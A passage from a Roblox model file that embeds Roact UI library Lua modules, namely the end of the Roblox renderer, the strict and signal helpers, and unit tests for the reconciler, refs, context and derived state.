		if newValue == nil then
			applyProp(virtualNode, propKey, nil, oldValue)
		end
	end
end

local RobloxRenderer = {}

function RobloxRenderer.isHostObject(target)
	return typeof(target) == "Instance"
end

function RobloxRenderer.mountHostNode(reconciler, virtualNode)
	local element = virtualNode.currentElement
	local hostParent = virtualNode.hostParent
	local hostKey = virtualNode.hostKey

	if config.internalTypeChecks then
		internalAssert(ElementKind.of(element) == ElementKind.Host, "Element at given node is not a host Element")
	end
	if config.typeChecks then
		assert(element.props.Name == nil, "Name can not be specified as a prop to a host component in Roact.")
		assert(element.props.Parent == nil, "Parent can not be specified as a prop to a host component in Roact.")
	end

	local instance = Instance.new(element.component)
	virtualNode.hostObject = instance

	local success, errorMessage = xpcall(function()
		applyProps(virtualNode, element.props)
	end, identity)

	if not success then
		local source = element.source

		if source == nil then
			source = "<enable element tracebacks>"
		end

		local fullMessage = applyPropsError:format(errorMessage, source)
		error(fullMessage, 0)
	end

	instance.Name = tostring(hostKey)

	local children = element.props[Children]

	if children ~= nil then
		reconciler.updateVirtualNodeWithChildren(virtualNode, virtualNode.hostObject, children)
	end

	instance.Parent = hostParent
	virtualNode.hostObject = instance

	applyRef(element.props[Ref], instance)

	if virtualNode.eventManager ~= nil then
		virtualNode.eventManager:resume()
	end
end

function RobloxRenderer.unmountHostNode(reconciler, virtualNode)
	local element = virtualNode.currentElement

	applyRef(element.props[Ref], nil)

	for _, childNode in pairs(virtualNode.children) do
		reconciler.unmountVirtualNode(childNode)
	end

	detachAllBindings(virtualNode)

	virtualNode.hostObject:Destroy()
end

function RobloxRenderer.updateHostNode(reconciler, virtualNode, newElement)
	local oldProps = virtualNode.currentElement.props
	local newProps = newElement.props

	if virtualNode.eventManager ~= nil then
		virtualNode.eventManager:suspend()
	end

	-- If refs changed, detach the old ref and attach the new one
	if oldProps[Ref] ~= newProps[Ref] then
		applyRef(oldProps[Ref], nil)
		applyRef(newProps[Ref], virtualNode.hostObject)
	end

	local success, errorMessage = xpcall(function()
		updateProps(virtualNode, oldProps, newProps)
	end, identity)

	if not success then
		local source = newElement.source

		if source == nil then
			source = "<enable element tracebacks>"
		end

		local fullMessage = updatePropsError:format(errorMessage, source)
		error(fullMessage, 0)
	end

	local children = newElement.props[Children]
	if children ~= nil or oldProps[Children] ~= nil then
		reconciler.updateVirtualNodeWithChildren(virtualNode, virtualNode.hostObject, children)
	end

	if virtualNode.eventManager ~= nil then
		virtualNode.eventManager:resume()
	end

	return virtualNode
end

return RobloxRenderer
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX0FD47511DA874572A74C27D0B0F28103">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">getDefaultInstanceProperty.spec</string>
					<string name="ScriptGuid">{738EDDBF-E45A-45BE-AB1E-2960FEF3792F}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local getDefaultInstanceProperty = require(script.Parent.getDefaultInstanceProperty)

	it("should get default name string values", function()
		local _, defaultName = getDefaultInstanceProperty("StringValue", "Name")

		expect(defaultName).to.equal("Value")
	end)

	it("should get default empty string values", function()
		local _, defaultValue = getDefaultInstanceProperty("StringValue", "Value")

		expect(defaultValue).to.equal("")
	end)

	it("should get default number values", function()
		local _, defaultValue = getDefaultInstanceProperty("IntValue", "Value")

		expect(defaultValue).to.equal(0)
	end)

	it("should get nil default values", function()
		local _, defaultValue = getDefaultInstanceProperty("ObjectValue", "Value")

		expect(defaultValue).to.equal(nil)
	end)

	it("should get bool default values", function()
		local _, defaultValue = getDefaultInstanceProperty("BoolValue", "Value")

		expect(defaultValue).to.equal(false)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9E41F09DBEB144C7B9394D8FD5042E5E">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">strict</string>
					<string name="ScriptGuid">{84670013-FF1C-42AB-A4B2-F0F6E1AD244A}</string>
					<ProtectedString name="Source"><![CDATA[local function strict(t, name)
	name = name or tostring(t)

	return setmetatable(t, {
		__index = function(self, key)
			local message = ("%q (%s) is not a valid member of %s"):format(
				tostring(key),
				typeof(key),
				name
			)

			error(message, 2)
		end,

		__newindex = function(self, key, value)
			local message = ("%q (%s) is not a valid member of %s"):format(
				tostring(key),
				typeof(key),
				name
			)

			error(message, 2)
		end,
	})
end

return strict]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX08E4BC3A99864A9C8C1B0FB915563E06">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createSignal</string>
					<string name="ScriptGuid">{1172F6B1-2C7E-45D2-96B7-2D9746CB0494}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	This is a simple signal implementation that has a dead-simple API.

		local signal = createSignal()

		local disconnect = signal:subscribe(function(foo)
			print("Cool foo:", foo)
		end)

		signal:fire("something")

		disconnect()
]]

local function addToMap(map, addKey, addValue)
	local new = {}

	for key, value in pairs(map) do
		new[key] = value
	end

	new[addKey] = addValue

	return new
end

local function removeFromMap(map, removeKey)
	local new = {}

	for key, value in pairs(map) do
		if key ~= removeKey then
			new[key] = value
		end
	end

	return new
end

local function createSignal()
	local connections = {}

	local function subscribe(self, callback)
		assert(typeof(callback) == "function", "Can only subscribe to signals with a function.")

		local connection = {
			callback = callback,
		}

		connections = addToMap(connections, callback, connection)

		local function disconnect()
			assert(not connection.disconnected, "Listeners can only be disconnected once.")

			connection.disconnected = true
			connections = removeFromMap(connections, callback)
		end

		return disconnect
	end

	local function fire(self, ...)
		for callback, connection in pairs(connections) do
			if not connection.disconnected then
				callback(...)
			end
		end
	end

	return {
		subscribe = subscribe,
		fire = fire,
	}
end

return createSignal]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2A467F3829C34612AB2EBB0C03612C34">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createReconciler.spec</string>
					<string name="ScriptGuid">{3C158C9F-4911-40A7-B992-6BB76B8F8B70}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local assign = require(script.Parent.assign)
	local createElement = require(script.Parent.createElement)
	local createFragment = require(script.Parent.createFragment)
	local createSpy = require(script.Parent.createSpy)
	local NoopRenderer = require(script.Parent.NoopRenderer)
	local Type = require(script.Parent.Type)
	local ElementKind = require(script.Parent.ElementKind)

	local createReconciler = require(script.Parent.createReconciler)

	local noopReconciler = createReconciler(NoopRenderer)

	describe("tree operations", function()
		it("should mount and unmount", function()
			local tree = noopReconciler.mountVirtualTree(createElement("StringValue"))

			expect(tree).to.be.ok()

			noopReconciler.unmountVirtualTree(tree)
		end)

		it("should mount, update, and unmount", function()
			local tree = noopReconciler.mountVirtualTree(createElement("StringValue"))

			expect(tree).to.be.ok()

			noopReconciler.updateVirtualTree(tree, createElement("StringValue"))

			noopReconciler.unmountVirtualTree(tree)
		end)
	end)

	describe("booleans", function()
		it("should mount booleans as nil", function()
			local node = noopReconciler.mountVirtualNode(false, nil, "test")
			expect(node).to.equal(nil)
		end)

		it("should unmount nodes if they are updated to a boolean value", function()
			local node = noopReconciler.mountVirtualNode(createElement("StringValue"), nil, "test")

			expect(node).to.be.ok()

			node = noopReconciler.updateVirtualNode(node, true)

			expect(node).to.equal(nil)
		end)
	end)

	describe("invalid elements", function()
		it("should throw errors when attempting to mount invalid elements", function()
			-- These function components return values with incorrect types
			local returnsString = function()
				return "Hello"
			end
			local returnsNumber = function()
				return 1
			end
			local returnsFunction = function()
				return function() end
			end
			local returnsTable = function()
				return {}
			end

			local hostParent = nil
			local key = "Some Key"

			expect(function()
				noopReconciler.mountVirtualNode(createElement(returnsString), hostParent, key)
			end).to.throw()

			expect(function()
				noopReconciler.mountVirtualNode(createElement(returnsNumber), hostParent, key)
			end).to.throw()

			expect(function()
				noopReconciler.mountVirtualNode(createElement(returnsFunction), hostParent, key)
			end).to.throw()

			expect(function()
				noopReconciler.mountVirtualNode(createElement(returnsTable), hostParent, key)
			end).to.throw()
		end)
	end)

	describe("Host components", function()
		it("should invoke the renderer to mount host nodes", function()
			local mountHostNode = createSpy(NoopRenderer.mountHostNode)

			local renderer = assign({}, NoopRenderer, {
				mountHostNode = mountHostNode.value,
			})

			local reconciler = createReconciler(renderer)

			local element = createElement("StringValue")
			local hostParent = nil
			local key = "Some Key"
			local node = reconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			expect(mountHostNode.callCount).to.equal(1)

			local values = mountHostNode:captureValues("reconciler", "node")

			expect(values.reconciler).to.equal(reconciler)
			expect(values.node).to.equal(node)
		end)

		it("should invoke the renderer to update host nodes", function()
			local updateHostNode = createSpy(NoopRenderer.updateHostNode)

			local renderer = assign({}, NoopRenderer, {
				mountHostNode = NoopRenderer.mountHostNode,
				updateHostNode = updateHostNode.value,
			})

			local reconciler = createReconciler(renderer)

			local element = createElement("StringValue")
			local hostParent = nil
			local key = "Key"
			local node = reconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			local newElement = createElement("StringValue")
			local newNode = reconciler.updateVirtualNode(node, newElement)

			expect(newNode).to.equal(node)

			expect(updateHostNode.callCount).to.equal(1)

			local values = updateHostNode:captureValues("reconciler", "node", "newElement")

			expect(values.reconciler).to.equal(reconciler)
			expect(values.node).to.equal(node)
			expect(values.newElement).to.equal(newElement)
		end)

		it("should invoke the renderer to unmount host nodes", function()
			local unmountHostNode = createSpy(NoopRenderer.unmountHostNode)

			local renderer = assign({}, NoopRenderer, {
				mountHostNode = NoopRenderer.mountHostNode,
				unmountHostNode = unmountHostNode.value,
			})

			local reconciler = createReconciler(renderer)

			local element = createElement("StringValue")
			local hostParent = nil
			local key = "Key"
			local node = reconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			reconciler.unmountVirtualNode(node)

			expect(unmountHostNode.callCount).to.equal(1)

			local values = unmountHostNode:captureValues("reconciler", "node")

			expect(values.reconciler).to.equal(reconciler)
			expect(values.node).to.equal(node)
		end)
	end)

	describe("Function components", function()
		it("should mount and unmount function components", function()
			local componentSpy = createSpy(function(props)
				return nil
			end)

			local element = createElement(componentSpy.value, {
				someValue = 5,
			})
			local hostParent = nil
			local key = "A Key"
			local node = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			expect(componentSpy.callCount).to.equal(1)

			local calledWith = componentSpy:captureValues("props")

			expect(calledWith.props).to.be.a("table")
			expect(calledWith.props.someValue).to.equal(5)

			noopReconciler.unmountVirtualNode(node)

			expect(componentSpy.callCount).to.equal(1)
		end)

		it("should mount single children of function components", function()
			local childComponentSpy = createSpy(function(props)
				return nil
			end)

			local parentComponentSpy = createSpy(function(props)
				return createElement(childComponentSpy.value, {
					value = props.value + 1,
				})
			end)

			local element = createElement(parentComponentSpy.value, {
				value = 13,
			})
			local hostParent = nil
			local key = "A Key"
			local node = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			expect(parentComponentSpy.callCount).to.equal(1)
			expect(childComponentSpy.callCount).to.equal(1)

			local parentCalledWith = parentComponentSpy:captureValues("props")
			local childCalledWith = childComponentSpy:captureValues("props")

			expect(parentCalledWith.props).to.be.a("table")
			expect(parentCalledWith.props.value).to.equal(13)

			expect(childCalledWith.props).to.be.a("table")
			expect(childCalledWith.props.value).to.equal(14)

			noopReconciler.unmountVirtualNode(node)

			expect(parentComponentSpy.callCount).to.equal(1)
			expect(childComponentSpy.callCount).to.equal(1)
		end)

		it("should mount fragments returned by function components", function()
			local childAComponentSpy = createSpy(function(props)
				return nil
			end)

			local childBComponentSpy = createSpy(function(props)
				return nil
			end)

			local parentComponentSpy = createSpy(function(props)
				return createFragment({
					A = createElement(childAComponentSpy.value, {
						value = props.value + 1,
					}),
					B = createElement(childBComponentSpy.value, {
						value = props.value + 5,
					}),
				})
			end)

			local element = createElement(parentComponentSpy.value, {
				value = 17,
			})
			local hostParent = nil
			local key = "A Key"
			local node = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(Type.of(node)).to.equal(Type.VirtualNode)

			expect(parentComponentSpy.callCount).to.equal(1)
			expect(childAComponentSpy.callCount).to.equal(1)
			expect(childBComponentSpy.callCount).to.equal(1)

			local parentCalledWith = parentComponentSpy:captureValues("props")
			local childACalledWith = childAComponentSpy:captureValues("props")
			local childBCalledWith = childBComponentSpy:captureValues("props")

			expect(parentCalledWith.props).to.be.a("table")
			expect(parentCalledWith.props.value).to.equal(17)

			expect(childACalledWith.props).to.be.a("table")
			expect(childACalledWith.props.value).to.equal(18)

			expect(childBCalledWith.props).to.be.a("table")
			expect(childBCalledWith.props.value).to.equal(22)

			noopReconciler.unmountVirtualNode(node)

			expect(parentComponentSpy.callCount).to.equal(1)
			expect(childAComponentSpy.callCount).to.equal(1)
			expect(childBComponentSpy.callCount).to.equal(1)
		end)
	end)

	describe("Fragments", function()
		it("should mount fragments", function()
			local fragment = createFragment({})
			local node = noopReconciler.mountVirtualNode(fragment, nil, "test")

			expect(node).to.be.ok()
			expect(ElementKind.of(node.currentElement)).to.equal(ElementKind.Fragment)
		end)

		it("should mount an empty fragment", function()
			local emptyFragment = createFragment({})
			local node = noopReconciler.mountVirtualNode(emptyFragment, nil, "test")

			expect(node).to.be.ok()
			expect(next(node.children)).to.never.be.ok()
		end)

		it("should mount all fragment's children", function()
			local childComponentSpy = createSpy(function(props)
				return nil
			end)
			local elements = {}
			local totalElements = 5

			for i=1, totalElements do
				elements["key"..tostring(i)] = createElement(childComponentSpy.value, {})
			end

			local fragments = createFragment(elements)
			local node = noopReconciler.mountVirtualNode(fragments, nil, "test")

			expect(node).to.be.ok()
			expect(childComponentSpy.callCount).to.equal(totalElements)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB2850C508A6A4B9CA8C15B88254EA0F0">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createRef.spec</string>
					<string name="ScriptGuid">{9C4A8AC9-0910-41E3-8755-D060152840E7}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Binding = require(script.Parent.Binding)
	local Type = require(script.Parent.Type)

	local createRef = require(script.Parent.createRef)

	it("should create refs, which are specialized bindings", function()
		local ref = createRef()

		expect(Type.of(ref)).to.equal(Type.Binding)
		expect(ref.current).to.equal(nil)
	end)

	it("should have a 'current' field that is the same as the internal binding's value", function()
		local ref = createRef()

		expect(ref.current).to.equal(nil)

		Binding.update(ref, 10)
		expect(ref.current).to.equal(10)
	end)

	it("should support tostring on refs", function()
		local ref = createRef()

		expect(ref.current).to.equal(nil)
		expect(tostring(ref)).to.equal("RoactRef(nil)")

		Binding.update(ref, 10)
		expect(tostring(ref)).to.equal("RoactRef(10)")
	end)

	it("should not allow assignments to the 'current' field", function()
		local ref = createRef()

		expect(ref.current).to.equal(nil)

		Binding.update(ref, 99)
		expect(ref.current).to.equal(99)

		expect(function()
			ref.current = 77
		end).to.throw()

		expect(ref.current).to.equal(99)
	end)

	it("should return the same thing from getValue as its current field", function()
		local ref = createRef()
		Binding.update(ref, 10)

		expect(ref:getValue()).to.equal(10)
		expect(ref:getValue()).to.equal(ref.current)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="Folder" referent="RBXC20C7638753843F2A45222B877DB4ED2">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<string name="Name">Component.spec</string>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
				<Item class="ModuleScript" referent="RBX12DF9EEB63824776A66201F3488242C9">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">context.spec</string>
						<string name="ScriptGuid">{87E2B8DE-0227-477A-8633-49DFB841A2B4}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local oneChild = require(script.Parent.Parent.oneChild)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be provided as an internal api on Component", function()
		local Provider = Component:extend("Provider")

		function Provider:init()
			self:__addContext("foo", "bar")
		end

		function Provider:render()
		end

		local element = createElement(Provider)
		local hostParent = nil
		local hostKey = "Provider"
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		local expectedContext = {
			foo = "bar",
		}

		assertDeepEqual(node.context, expectedContext)
	end)

	it("should be inherited from parent stateful nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = {
				hello = self:__getContext("hello"),
				value = self:__getContext("value"),
			}
		end

		function Consumer:render()
		end

		local Parent = Component:extend("Parent")

		function Parent:render()
			return createElement(Consumer)
		end

		local element = createElement(Parent)
		local hostParent = nil
		local hostKey = "Parent"
		local context = {
			hello = "world",
			value = 6,
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, context)

		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.context)
		assertDeepEqual(node.context, context)
		assertDeepEqual(capturedContext, context)
	end)

	it("should be inherited from parent function nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = {
				hello = self:__getContext("hello"),
				value = self:__getContext("value"),
			}
		end

		function Consumer:render()
		end

		local function Parent()
			return createElement(Consumer)
		end

		local element = createElement(Parent)
		local hostParent = nil
		local hostKey = "Parent"
		local context = {
			hello = "world",
			value = 6,
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, context)

		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.context)
		assertDeepEqual(node.context, context)
		assertDeepEqual(capturedContext, context)
	end)

	it("should not copy the context table if it doesn't need to", function()
		local Parent = Component:extend("Parent")

		function Parent:init()
			self:__addContext("parent", "I'm here!")
		end

		function Parent:render()
			-- Create some child element
			return createElement(function() end)
		end

		local element = createElement(Parent)
		local hostParent = nil
		local hostKey = "Parent"
		local parentNode = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		local expectedContext = {
			parent = "I'm here!",
		}

		assertDeepEqual(parentNode.context, expectedContext)

		local childNode = oneChild(parentNode.children)

		-- Parent and child should have the same context table
		expect(parentNode.context).to.equal(childNode.context)
	end)

	it("should not allow context to move up the tree", function()
		local ChildProvider = Component:extend("ChildProvider")

		function ChildProvider:init()
			self:__addContext("child", "I'm here too!")
		end

		function ChildProvider:render()
		end

		local ParentProvider = Component:extend("ParentProvider")

		function ParentProvider:init()
			self:__addContext("parent", "I'm here!")
		end

		function ParentProvider:render()
			return createElement(ChildProvider)
		end

		local element = createElement(ParentProvider)
		local hostParent = nil
		local hostKey = "Parent"

		local parentNode = noopReconciler.mountVirtualNode(element, hostParent, hostKey)
		local childNode = oneChild(parentNode.children)

		local expectedParentContext = {
			parent = "I'm here!",
			-- Context does not travel back up
		}

		local expectedChildContext = {
			parent = "I'm here!",
			child = "I'm here too!"
		}

		assertDeepEqual(parentNode.context, expectedParentContext)
		assertDeepEqual(childNode.context, expectedChildContext)
	end)

	it("should contain values put into the tree by parent nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = {
				dont = self:__getContext("dont"),
				frob = self:__getContext("frob"),
			}
		end

		function Consumer:render()
		end

		local Provider = Component:extend("Provider")

		function Provider:init()
			self:__addContext("frob", "ulator")
		end

		function Provider:render()
			return createElement(Consumer)
		end

		local element = createElement(Provider)
		local hostParent = nil
		local hostKey = "Consumer"
		local context = {
			dont = "try it",
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, context)

		local initialContext = {
			dont = "try it",
		}

		local expectedContext = {
			dont = "try it",
			frob = "ulator",
		}

		-- Because components mutate context, we're careful with equality
		expect(node.context).never.to.equal(context)
		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.context)

		assertDeepEqual(context, initialContext)
		assertDeepEqual(node.context, expectedContext)
		assertDeepEqual(capturedContext, expectedContext)
	end)

	it("should transfer context to children that are replaced", function()
		local ConsumerA = Component:extend("ConsumerA")

		local function captureAllContext(component)
			return {
				A = component:__getContext("A"),
				B = component:__getContext("B"),
				frob = component:__getContext("frob"),
			}
		end

		local capturedContextA
		function ConsumerA:init()
			self:__addContext("A", "hello")

			capturedContextA = captureAllContext(self)
		end

		function ConsumerA:render()
		end

		local ConsumerB = Component:extend("ConsumerB")

		local capturedContextB
		function ConsumerB:init()
			self:__addContext("B", "hello")

			capturedContextB = captureAllContext(self)
		end

		function ConsumerB:render()
		end

		local Provider = Component:extend("Provider")

		function Provider:init()
			self:__addContext("frob", "ulator")
		end

		function Provider:render()
			local useConsumerB = self.props.useConsumerB

			if useConsumerB then
				return createElement(ConsumerB)
			else
				return createElement(ConsumerA)
			end
		end

		local hostParent = nil
		local hostKey = "Consumer"

		local element = createElement(Provider)
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		local expectedContextA = {
			frob = "ulator",
			A = "hello",
		}

		assertDeepEqual(capturedContextA, expectedContextA)

		local expectedContextB = {
			frob = "ulator",
			B = "hello",
		}

		local replacedElement = createElement(Provider, {
			useConsumerB = true,
		})
		noopReconciler.updateVirtualNode(node, replacedElement)

		assertDeepEqual(capturedContextB, expectedContextB)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBXAC1CB821E6884458A47B6283945B1DFF">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">getDerivedStateFromProps.spec</string>
						<string name="ScriptGuid">{57797D6F-0DBC-4C46-9B4C-B3965430B66E}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createSpy = require(script.Parent.Parent.createSpy)
	local createElement = require(script.Parent.Parent.createElement)
	local createFragment = require(script.Parent.Parent.createFragment)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked on initial mount", function()
		local getDerivedSpy = createSpy()
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:render()
			return nil
		end

		local element = createElement(WithDerivedState, {
			someProp = 1,
		})
		local hostParent = nil
		local hostKey = "WithDerivedState"

		noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		expect(getDerivedSpy.callCount).to.equal(1)

		local values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, { someProp = 1 })
		assertDeepEqual(values.state, {})
	end)

	it("should be invoked when updated via props", function()
		local getDerivedSpy = createSpy()
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:render()
			return nil
		end

		local hostParent = nil
		local hostKey = "WithDerivedState"

		local node = noopReconciler.mountVirtualNode(createElement(WithDerivedState, {
			someProp = 1,
		}), hostParent, hostKey)

		noopReconciler.updateVirtualNode(node, createElement(WithDerivedState, {
			someProp = 2,
		}))

		expect(getDerivedSpy.callCount).to.equal(2)

		local values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, { someProp = 2 })
		assertDeepEqual(values.state, {})
	end)

	it("should be invoked when updated via state", function()
		local getDerivedSpy = createSpy()
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:init()
			self:setState({
				someState = 1,
			})
		end

		function WithDerivedState:render()
			return nil
		end

		local element = createElement(WithDerivedState)
		local hostParent = nil
		local hostKey = "WithDerivedState"

		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		noopReconciler.updateVirtualNode(node, element, {
			someState = 2,
		})

		-- getDerivedStateFromProps will be called:
		-- * Once on empty props
		-- * Once during the self:setState in init
		-- * Once more, defensively, on the resulting state AFTER init
		-- * On updating with new state via updateVirtualNode
		expect(getDerivedSpy.callCount).to.equal(4)

		local values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, {})
		assertDeepEqual(values.state, { someState = 2 })
	end)

	it("should be invoked when updating via state in init (which skips reconciliation)", function()
		local getDerivedSpy = createSpy()
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:init()
			self:setState({
				stateFromInit = 1,
			})
		end

		function WithDerivedState:render()
			return nil
		end

		local element = createElement(WithDerivedState, {
			someProp = 1,
		})
		local hostParent = nil
		local hostKey = "WithDerivedState"

		noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		-- getDerivedStateFromProps will be called:
		-- * Once on empty props
		-- * Once during the self:setState in init
		-- * Once more, defensively, on the resulting state AFTER init
		expect(getDerivedSpy.callCount).to.equal(3)

		local values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, {
			someProp = 1,
		})
		assertDeepEqual(values.state, {
			stateFromInit = 1,
		})
	end)

	it("should receive defaultProps", function()
		local getDerivedSpy = createSpy()
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.defaultProps = {
			someDefaultProp = "foo",
		}

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:render()
			return nil
		end

		local element = createElement(WithDerivedState, {
			someProp = 1,
		})
		local hostParent = nil
		local hostKey = "WithDerivedState"

		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		expect(getDerivedSpy.callCount).to.equal(1)

		local values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, {
			someDefaultProp = "foo",
			someProp = 1,
		})

		-- Update via props, confirm that defaultProp is still present
		element = createElement(WithDerivedState, {
			someProp = 2,
		})

		noopReconciler.updateVirtualNode(node, element)

		expect(getDerivedSpy.callCount).to.equal(2)

		values = getDerivedSpy:captureValues("props", "state")

		assertDeepEqual(values.props, {
			someDefaultProp = "foo",
			someProp = 2,
		})
	end)

	it("should derive state for all setState updates, even when deferred", function()
		local Child = Component:extend("Child")
		local stateUpdaterSpy = createSpy(function()
			return {}
		end)
		local stateDerivedSpy = createSpy()

		function Child:render()
			return nil
		end

		function Child:didMount()
			self.props.callback()
		end

		local Parent = Component:extend("Parent")

		Parent.getDerivedStateFromProps = stateDerivedSpy.value

		function Parent:render()
			local callback = function()
				self:setState(stateUpdaterSpy.value)
			end

			return createFragment({
				ChildA = createElement(Child, {
					callback = callback,
				}),
				ChildB = createElement(Child, {
					callback = callback,
				}),
			})
		end

		local element = createElement(Parent)
		local hostParent = nil
		local key = "Test"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(stateUpdaterSpy.callCount).to.equal(2)

		-- getDerivedStateFromProps is always called on initial state
		expect(stateDerivedSpy.callCount).to.equal(3)
	end)

	it("should have derived state after assigning to state in init", function()
		local getStateCallback
		local getDerivedSpy = createSpy(function()
			return {
				derived = true,
			}
		end)
		local WithDerivedState = Component:extend("WithDerivedState")

		WithDerivedState.getDerivedStateFromProps = getDerivedSpy.value

		function WithDerivedState:init()
			self.state = {
				init = true,
			}

			getStateCallback = function()
				return self.state
			end
		end

		function WithDerivedState:render()
			return nil
		end

		local hostParent = nil
		local hostKey = "WithDerivedState"
		local element = createElement(WithDerivedState)

		noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		expect(getDerivedSpy.callCount).to.equal(2)

		assertDeepEqual(getStateCallback(), {
			init = true,
			derived = true,
		})
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX2C2FEF7846894DC8B4EB6A35A3658367">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">didMount.spec</string>
						<string name="ScriptGuid">{2F6AA791-8D70-473B-9DC7-B6D0C3DB63BC}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when mounted", function()
		local MyComponent = Component:extend("MyComponent")

		local didMountSpy = createSpy()

